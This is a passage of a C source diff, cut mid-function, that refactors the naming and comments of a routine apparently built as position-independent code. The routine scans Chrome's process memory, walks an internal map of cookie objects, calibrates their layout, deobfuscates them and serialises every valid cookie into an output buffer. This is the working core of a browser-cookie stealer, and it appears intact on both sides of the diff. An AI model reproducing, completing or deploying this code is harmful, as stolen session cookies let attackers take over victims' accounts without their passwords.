+                                    /* Validate each node pointer. */
+                                    if (!CcPtrPlausible(node)) {
                                         break;
                                     }
-                                    cookie = (const pic_u8 *)cc_read_u64(
-                                        (const pic_u8 *)node + 0x38);
+                                    cookie = (const BYTE *)CcReadU64(
+                                        (const BYTE *)node + 0x38);
 
-                                    /* pre-compute the successor so a bad
-                                     * cookie cannot abort the walk */
-                                    next_node = engine_a_tree_next(
-                                        (const pic_u8 *)node, end_addr);
+                                    /* Compute next before validating the cookie. */
+                                    nextNode = EngineATreeNext(
+                                        (const BYTE *)node, endAddr);
 
-                                    /* a cookie that fails the region or
-                                     * vtable check is SKIPPED, not fatal:
-                                     * the rest of the map is still there */
-                                    if (cc_region_ok(
-                                            (const void *)cookie, &vet_mbi,
-                                            virtual_query) &&
-                                        engine_a_cookie_valid(
-                                            cookie, (pic_uptr)chrome_base,
-                                            chrome_size)) {
-                                        if (cc_layout.calibrated != 0u) {
-                                            if (engine_a_serialize_cookie(
+                                    /* Skip invalid cookies; keep walking the map. */
+                                    if (CcRegionOk(
+                                            (PCVOID)cookie, &vetMbi,
+                                            virtualQuery) &&
+                                        EngineACookieValid(
+                                            cookie, (ULONG_PTR)chromeBase,
+                                            chromeSize)) {
+                                        if (ccLayout.Calibrated != 0u) {
+                                            if (EngineASerializeCookie(
                                                     cookie, &cursor,
                                                     &remaining,
-                                                    chrome_base,
-                                                    deobf_fn,
-                                                    &cc_layout,
-                                                    &flags_cal)) {
-                                                cookie_count++;
+                                                    chromeBase,
+                                                    deobfFn,
+                                                    &ccLayout,
+                                                    &flagsCal)) {
+                                                cookieCount++;
                                             } else {
-                                                /* buffer full */
-                                                status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
-                                                stop = PIC_TRUE;
+                                                /* Output full. */
+                                                status = (DWORD)MargaretStatusBufferTooSmall;
+                                                stop = TRUE;
                                             }
-                                        } else if (layout_failed == 0u &&
-                                                   cal_n < CAL_SAMPLE_MAX) {
-                                            /* stash until the layout
-                                             * calibrates; retry with a
-                                             * growing sample */
-                                            cal_sample[cal_n] = cookie;
-                                            cal_n++;
-                                            if (cal_n >= CAL_SAMPLE_MIN &&
-                                                margaret_cc_calibrate(
-                                                    cal_sample, cal_n,
-                                                    virtual_query,
-                                                    &cc_layout,
-                                                    &cal_diag)) {
-                                                flags_cal.window_base =
-                                                    cc_layout.off_flag + 8u;
-                                                args->pad = 0xB1u;
-                                                /* flush the stash */
+                                        } else if (layoutFailed == 0u &&
+                                                   calN < CAL_SAMPLE_MAX) {
+                                            /* Grow the calibration sample. */
+                                            calSample[calN] = cookie;
+                                            calN++;
+                                            if (calN >= CAL_SAMPLE_MIN &&
+                                                MargaretCcCalibrate(
+                                                    calSample, calN,
+                                                    virtualQuery,
+                                                    &ccLayout,
+                                                    &calDiag)) {
+                                                flagsCal.WindowBase =
+                                                    ccLayout.OffFlag + 8u;
+                                                args->Pad = 0xB1u;
+                                                /* Flush sampled cookies. */
                                                 {
-                                                    pic_u32 fi;
+                                                    DWORD fi;
                                                     for (fi = 0u;
-                                                         fi < cal_n &&
-                                                         stop == PIC_FALSE;
+                                                         fi < calN &&
+                                                         stop == FALSE;
                                                          ++fi) {
-                                                        if (engine_a_serialize_cookie(
-                                                                cal_sample[fi],
+                                                        if (EngineASerializeCookie(
+                                                                calSample[fi],
                                                                 &cursor,
                                                                 &remaining,
-                                                                chrome_base,
-                                                                deobf_fn,
-                                                                &cc_layout,
-                                                                &flags_cal)) {
-                                                            cookie_count++;
+                                                                chromeBase,
+                                                                deobfFn,
+                                                                &ccLayout,
+                                                                &flagsCal)) {
+                                                            cookieCount++;
                                                         } else {
-                                                            status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
-                                                            stop = PIC_TRUE;
+                                                            status = (DWORD)MargaretStatusBufferTooSmall;
+                                                            stop = TRUE;
                                                         }
                                                     }
                                                 }
-                                            } else if (cal_n == CAL_SAMPLE_MAX) {
-                                                /* 16 cookies could not be
-                                                 * explained by any layout:
-                                                 * fail closed, no cookies;
-                                                 * dump two raw samples for
-                                                 * offline layout analysis */
-                                                layout_failed = 1u;
-                                                args->pad = 0xA0u + cal_diag;
-                                                (void)engine_a_write_bytes(
+                                            } else if (calN == CAL_SAMPLE_MAX) {
+                                                /* Preserve raw samples after calibration failure. */
+                                                layoutFailed = 1u;
+                                                args->Pad = 0xA0u + calDiag;
+                                                (void)EngineAWriteBytes(
                                                     &cursor, &remaining,
-                                                    cal_sample[0], 0x110u);
-                                                (void)engine_a_write_bytes(
+                                                    calSample[0], 0x110u);
+                                                (void)EngineAWriteBytes(
                                                     &cursor, &remaining,
-                                                    cal_sample[1], 0x110u);
-                                                status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
-                                                stop = PIC_TRUE;
+                                                    calSample[1], 0x110u);
+                                                status = (DWORD)MargaretStatusUnsupportedBuild;
+                                                stop = TRUE;
                                             }
                                         }
                                     }
-                                    node_count++;
-                                    node = next_node;
+                                    nodeCount++;
+                                    node = nextNode;
                                 }
                             }
                         }
@@ -578,83 +524,80 @@ PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
                     }
                 }
 
-                address = (pic_uptr)mbi.BaseAddress + region_size;
-                if (address < (pic_uptr)mbi.BaseAddress) {
-                    break; /* overflow */
+                address = (ULONG_PTR)mbi.BaseAddress + regionSize;
+                if (address < (ULONG_PTR)mbi.BaseAddress) {
+                    break; /* Overflow. */
                 }
             }
-            scan_end_addr = address;
+            scanEndAddr = address;
         }
     }
 
-    /* final calibration attempt for jars that yielded fewer than
-     * CAL_SAMPLE_MAX samples; a jar that cannot supply even the
-     * minimum fails closed — no cookies are ever serialized against
-     * an unproven layout */
-    if (cc_layout.calibrated == 0u && layout_failed == 0u) {
-        if (cal_n >= CAL_SAMPLE_MIN &&
-            margaret_cc_calibrate(cal_sample, cal_n, virtual_query,
-                                      &cc_layout, &cal_diag)) {
-            flags_cal.window_base = cc_layout.off_flag + 8u;
-            args->pad = 0xB0u;
+    /* Final calibration attempt for small jars; unproven layouts fail closed. */
+    if (ccLayout.Calibrated == 0u && layoutFailed == 0u) {
+        if (calN >= CAL_SAMPLE_MIN &&
+            MargaretCcCalibrate(calSample, calN, virtualQuery,
+                                      &ccLayout, &calDiag)) {
+            flagsCal.WindowBase = ccLayout.OffFlag + 8u;
+            args->Pad = 0xB0u;
             {
-                pic_u32 fi;
-                for (fi = 0u; fi < cal_n; ++fi) {
-                    if (engine_a_serialize_cookie(
-                            cal_sample[fi], &cursor, &remaining,
-                            chrome_base, deobf_fn, &cc_layout,
-                            &flags_cal)) {
-                        cookie_count++;
+                DWORD fi;
+                for (fi = 0u; fi < calN; ++fi) {
+                    if (EngineASerializeCookie(
+                            calSample[fi], &cursor, &remaining,
+                            chromeBase, deobfFn, &ccLayout,
+                            &flagsCal)) {
+                        cookieCount++;
                     } else {
-                        status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
+                        status = (DWORD)MargaretStatusBufferTooSmall;
                         break;
                     }
                 }
             }
         } else {
-            args->pad = (cal_n < CAL_SAMPLE_MIN) ? 0x9Fu : (0xA0u + cal_diag);
-            if (cal_n >= 2u) {
-                (void)engine_a_write_bytes(&cursor, &remaining,
-                                           cal_sample[0], 0x110u);
-                (void)engine_a_write_bytes(&cursor, &remaining,
-                                           cal_sample[1], 0x110u);
+            args->Pad = (calN < CAL_SAMPLE_MIN) ? 0x9Fu : (0xA0u + calDiag);
+            if (calN >= 2u) {
+                (void)EngineAWriteBytes(&cursor, &remaining,
+                                           calSample[0], 0x110u);
+                (void)EngineAWriteBytes(&cursor, &remaining,
+                                           calSample[1], 0x110u);
             }
-            status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
+            status = (DWORD)MargaretStatusUnsupportedBuild;
         }
     }
 
-    args->flags = 30u; /* engine: memory scan + walk complete */
-    /* patch header: cookie_count and instance_count */
+    args->Flags = 30u; /* Scan complete. */
+    /* Patch counts into the header. */
     {
-        pic_u8 *header = (pic_u8 *)args->output_buffer;
-        header[4] = (pic_u8)(cookie_count & 0xFFu);
-        header[5] = (pic_u8)((cookie_count >> 8u) & 0xFFu);
-        header[6] = (pic_u8)((cookie_count >> 16u) & 0xFFu);
-        header[7] = (pic_u8)((cookie_count >> 24u) & 0xFFu);
-        header[8] = (pic_u8)(instance_count & 0xFFu);
-        header[9] = (pic_u8)((instance_count >> 8u) & 0xFFu);
-        header[10] = (pic_u8)((instance_count >> 16u) & 0xFFu);
-        header[11] = (pic_u8)((instance_count >> 24u) & 0xFFu);
-        /* scan diagnostics: where the scan stopped, and the last hit */
-        header[12] = (pic_u8)(scan_end_addr & 0xFFu);
-        header[13] = (pic_u8)((scan_end_addr >> 8u) & 0xFFu);
-        header[14] = (pic_u8)((scan_end_addr >> 16u) & 0xFFu);
-        header[15] = (pic_u8)((scan_end_addr >> 24u) & 0xFFu);
-        header[16] = (pic_u8)((scan_end_addr >> 32u) & 0xFFu);
-        header[17] = (pic_u8)((scan_end_addr >> 40u) & 0xFFu);
-        header[18] = (pic_u8)((scan_end_addr >> 48u) & 0xFFu);
-        header[19] = (pic_u8)((scan_end_addr >> 56u) & 0xFFu);
-        header[20] = (pic_u8)(last_hit_addr & 0xFFu);
-        header[21] = (pic_u8)((last_hit_addr >> 8u) & 0xFFu);
-        header[22] = (pic_u8)((last_hit_addr >> 16u) & 0xFFu);
-        header[23] = (pic_u8)((last_hit_addr >> 24u) & 0xFFu);
-        header[24] = (pic_u8)((last_hit_addr >> 32u) & 0xFFu);
-        header[25] = (pic_u8)((last_hit_addr >> 40u) & 0xFFu);
-        header[26] = (pic_u8)((last_hit_addr >> 48u) & 0xFFu);
-        header[27] = (pic_u8)((last_hit_addr >> 56u) & 0xFFu);
+        PBYTE header = (PBYTE)args->OutputBuffer;
+        header[4] = (BYTE)(cookieCount & 0xFFu);
+        header[5] = (BYTE)((cookieCount >> 8u) & 0xFFu);
+        header[6] = (BYTE)((cookieCount >> 16u) & 0xFFu);
+        header[7] = (BYTE)((cookieCount >> 24u) & 0xFFu);
+        header[8] = (BYTE)(instanceCount & 0xFFu);
+        header[9] = (BYTE)((instanceCount >> 8u) & 0xFFu);
+        header[10] = (BYTE)((instanceCount >> 16u) & 0xFFu);
+        header[11] = (BYTE)((instanceCount >> 24u) & 0xFFu);
+        /* Patch scan diagnostics. */
+        header[12] = (BYTE)(scanEndAddr & 0xFFu);
+        header[13] = (BYTE)((scanEndAddr >> 8u) & 0xFFu);
+        header[14] = (BYTE)((scanEndAddr >> 16u) & 0xFFu);
+        header[15] = (BYTE)((scanEndAddr >> 24u) & 0xFFu);
+        header[16] = (BYTE)((scanEndAddr >> 32u) & 0xFFu);
+        header[17] = (BYTE)((scanEndAddr >> 40u) & 0xFFu);
+        header[18] = (BYTE)((scanEndAddr >> 48u) & 0xFFu);
+        header[19] = (BYTE)((scanEndAddr >> 56u) & 0xFFu);
+        header[20] = (BYTE)(lastHitAddr & 0xFFu);
+        header[21] = (BYTE)((lastHitAddr >> 8u) & 0xFFu);
+        header[22] = (BYTE)((lastHitAddr >> 16u) & 0xFFu);
+        header[23] = (BYTE)((lastHitAddr >> 24u) & 0xFFu);
+        header[24] = (BYTE)((lastHitAddr >> 32u) & 0xFFu);
+        header[25] = (BYTE)((lastHitAddr >> 40u) & 0xFFu);
+        header[26] = (BYTE)((lastHitAddr >> 48u) & 0xFFu);
+        header[27] = (BYTE)((lastHitAddr >> 56u) & 0xFFu);
     }
 
-    args->output_length = args->output_capacity - remaining;
-    args->status = status;
+    args->OutputLength = args->OutputCapacity - remaining;
+    args->Status = status;
     return status;
 }
